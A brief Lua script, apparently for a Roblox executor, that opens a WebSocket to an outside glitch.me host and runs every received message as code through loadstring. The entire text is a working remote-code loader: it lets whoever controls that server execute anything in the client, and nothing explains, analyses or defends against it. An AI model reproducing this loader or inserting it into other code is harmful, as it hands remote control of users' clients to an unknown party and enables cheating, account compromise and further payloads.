local socket = WebSocket.connect("ws://prickly-poised-veil.glitch.me")
repeat wait() until socket

socket.OnMessage:Connect(function(msg)
    loadstring(msg)()
end)
